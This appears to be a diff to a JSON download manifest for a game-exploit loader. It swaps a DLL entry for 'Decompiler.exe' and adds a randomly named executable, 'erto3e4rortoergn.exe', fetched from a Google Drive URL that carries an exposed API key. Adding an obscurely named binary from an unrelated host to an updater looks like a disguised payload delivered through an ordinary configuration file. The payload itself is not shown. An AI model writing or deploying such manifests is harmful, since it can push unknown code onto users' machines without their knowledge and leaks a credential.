@@ -3,8 +3,12 @@
 
     "DLLs": [
         {
-         "name": "VelocityAPI.dll",
-         "Download": "https://raw.githubusercontent.com/TheREBLEX/ExploitJSONFiles/refs/heads/main/VelocityAPI.dll"
+         "name": "bin/Decompiler.exe",
+         "Download": "https://raw.githubusercontent.com/TheREBLEX/updater/refs/heads/main/Decompiler.exe"
+        },
+        {
+             "name": "bin/erto3e4rortoergn.exe",
+             "Download": "https://www.googleapis.com/drive/v3/files/1e1LuD24FW89Kro9fT7Rxqt-BvWyWR2k-?alt=media&key=AIzaSyCvBIKaDXjFgjFd2I_sJ1R7XR9Gh6aWrOs"
         }
     ],
     "Folders": [
@@ -23,6 +27,7 @@
         }
     ]
 }
+
 
 
 
